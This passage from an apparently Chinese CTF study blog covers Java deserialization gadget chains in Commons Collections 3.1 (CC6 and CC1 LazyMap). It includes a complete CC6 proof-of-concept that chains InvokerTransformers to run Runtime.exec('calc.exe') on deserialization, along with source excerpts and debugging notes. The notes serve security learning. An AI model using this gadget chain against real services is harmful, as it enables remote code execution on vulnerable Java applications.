class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ReflectFinalTest</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectFinalTest</span>();</span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ReflectFinalTest.class;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;myName&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, <span class="string">&quot;I&#x27;m not KC1zs4&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(obj.myName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？"><a href="#Q-为什么会在field-set-myLazyMap-payload-也调用一次？总共调用两次？" class="headerlink" title="Q: 为什么会在field.set(myLazyMap,payload)也调用一次？总共调用两次？"></a>Q: 为什么会在<code>field.set(myLazyMap,payload)</code>也调用一次？总共调用两次？</h4><ol><li>Debug<ol><li>debug的话就会触发，但是如果正常运行的话(把序列化和反序列化部分注释掉)则不会进行触发 –&gt; <strong>p牛的解决方法中也会有</strong></li><li>判断：应该是debug触发了某种触发的方式</li></ol></li></ol><h4 id="Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？"><a href="#Q-为什么myLazyMap-remove-key1-否则反序列化无法调用？" class="headerlink" title="Q: 为什么myLazyMap.remove(&quot;key1&quot;);否则反序列化无法调用？"></a>Q: 为什么<code>myLazyMap.remove(&quot;key1&quot;);</code>否则反序列化无法调用？</h4><blockquote><p>本质上是保证<code>map.containsKey(key) == false</code></p></blockquote><ol><li><p>注意到在LazyMap中要调用<code>transform()</code>的条件</p><ol><li>需要之前没有包含这一个key，如果调用过一次get(key)后，会进行一次put进去LazyMap中，LazyMap的put没有利用点 –&gt; <strong>这里通过调试可以发现的</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>REASON</strong></p><ol><li>而在将tme放入hashMap中有一道工序是<code>put()</code>，在urldns中可知这里会先行对tme进行hashCode()，导致原本map中没有的key在还没序列化的put这一步就已经被放入LazyMap了</li><li>那么后面再反序列化调用HashMap的readObejct再到调用链这里就没有触发<code>map.containsKey(key) == false</code>这一个点</li></ol></li><li><p><strong>Solution</strong></p><ol><li>在put之后再把该(key, value)给remove掉<code>outerMap.remove(&quot;keykey&quot;)</code></li></ol></li></ol><h4 id="构造poc的一些注意点"><a href="#构造poc的一些注意点" class="headerlink" title="构造poc的一些注意点"></a>构造poc的一些注意点</h4><ol><li><em><strong>还是要万全的链出来再写比较好(边写边想也可，就是不要急)，总之就是链要全</strong></em>，写的时候有一些模糊导致被卡到了</li><li>不要被一环套一环给搞晕了，清除调用链就好<ol><li>最底层使用HashMap是没有影响的</li><li>本质上是通过Entry进行调用的，主要再Entry的链上进行</li></ol></li></ol><h3 id="CC6-poc-phith0n"><a href="#CC6-poc-phith0n" class="headerlink" title="CC6 poc phith0n"></a>CC6 poc phith0n</h3><ol><li>浅浅分析一下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span></span><br><span class="line">                ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6"><a href="#总结一下-从CC1-TransformedMap到CC1-LazyMap再到CC6" class="headerlink" title="总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6"></a>总结一下: 从CC1_TransformedMap到CC1_LazyMap再到CC6</h2><blockquote><p>不止要理解原理，还要理解探索的过程，这样才可以自己探索嘛</p></blockquote><ol><li>在链中要有一个利用点</li><li>对于利用点的各个判断条件都需要进行满足</li><li>链的利用<strong>要对那些类比较熟悉</strong>，多看就好了，能一次就记住也是强(多总结)</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈12</li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md">信工所大佬</a> –&gt; 比较多基于cc5的</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(4)_CC1_LazyMap</title>
      <link href="/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/"/>
      <url>/2024/11/17/Java%E5%AE%89%E5%85%A85(4)_CC1_LazyMap/</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><blockquote><p>和Java安全5(3)中的一样的</p></blockquote><ol><li><p>JDK版本应该为8u71之前</p></li><li><p>使用maven搭建，commons-collections3.1</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p>换源使用新建setting.xml，加入<a href="https://developer.aliyun.com/mirror/?serviceType=&tag=&keyword=maven">阿里源</a></p></li><li><p>随后下载common-collections3.1的源码就ok，似乎本来是class文件来着</p></li></ol><h2 id="CC1-LazyMap前置知识"><a href="#CC1-LazyMap前置知识" class="headerlink" title="CC1_LazyMap前置知识"></a>CC1_LazyMap前置知识</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><ol><li><p>idea中看一下源码</p><ol><li>宏观的理解就是用于自定义在获取没有的key时的行为，lazy是懒加载，只有在被get时才会进行transform</li><li><strong>装饰器</strong>！根据构造器中的super(map)可知传入和返回的那个对象中指向的map是同一个，会同时被修改，这里也指明了not copies –&gt; TransformedMap也是指向同一个map对象</li><li>实现了readObject()，writeObject()并且实现了Serialzable接口，本身支持进行序列化与反序列化</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to create objects in the map on demand.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * When the &#123;<span class="doctag">@link</span> #get(Object)&#125; method is called with a key that does not</span></span><br><span class="line"><span class="comment"> * exist in the map, the factory is used to create the object. The created</span></span><br><span class="line"><span class="comment"> * object will be added to the map using the requested key.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * For instance:</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * Factory factory = new Factory() &#123;</span></span><br><span class="line"><span class="comment"> *     public Object create() &#123;</span></span><br><span class="line"><span class="comment"> *         return new Date();</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * Map lazy = Lazy.map(new HashMap(), factory);</span></span><br><span class="line"><span class="comment"> * Object obj = lazy.get(&quot;NOW&quot;);</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * After the above code is executed, &lt;code&gt;obj&lt;/code&gt; will contain</span></span><br><span class="line"><span class="comment"> * a new &lt;code&gt;Date&lt;/code&gt; instance. Furthermore, that &lt;code&gt;Date&lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * instance is mapped to the &quot;NOW&quot; key in the map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This class is Serializable from Commons Collections 3.1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/07 23:30:33 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Paul Jack</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The factory to use to construct elements */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>关注一下get()函数</p><ol><li>对于不存在的key，在访问时会尽心创建，调用<code>transform()</code>，否则直接使用属性的方法map.get()进行返回</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no need to wrap keySet, entrySet or values as they are views of</span></span><br><span class="line"><span class="comment">// existing map entries - you can&#x27;t do a map-style get on them.</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="LazyMap实现一下加深理解"><a href="#LazyMap实现一下加深理解" class="headerlink" title="LazyMap实现一下加深理解"></a>LazyMap实现一下加深理解</h3><blockquote><p>在idea中运行</p></blockquote><ol><li>LazyMap的一个小小实现，那这样要利用还是需要用到<code>ChainedTransformer</code>来构造调用链啊，最后再通过get()方法来进行利用而已(<em><strong>入口点</strong></em>)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap的实现</span></span><br><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(myMap,<span class="keyword">new</span> <span class="title class_">LazyMapTransformer</span>());</span><br><span class="line">        lazyMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        System.out.println(lazyMap.get(<span class="string">&quot;key2&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LazyMapTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;you called LazyMapTransformer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;h3110 w0r1d&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><blockquote><p>需要用到动态代理是因为还是基于: sun.reflect.annotation.AnnotationInvocationHandler这一个类来构造payload的<br>基本原理详见《Java安全2_jdk动态代理》博客文章，这里讲一下和CC1的利用</p></blockquote><ol><li><p>已知利用类还是sun.reflect.annotation.AnnotationInvocationHandler，看一下源码，这里是在invoke()这里</p><ol><li>注意到如果var4(也就是Method var2.getName())已知不是被预制的那些方法的话，这里会调用到this.memberValues.get(var4)</li><li><strong>目标转移到使得memberValues是我们控制的恶意LazyMap</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span 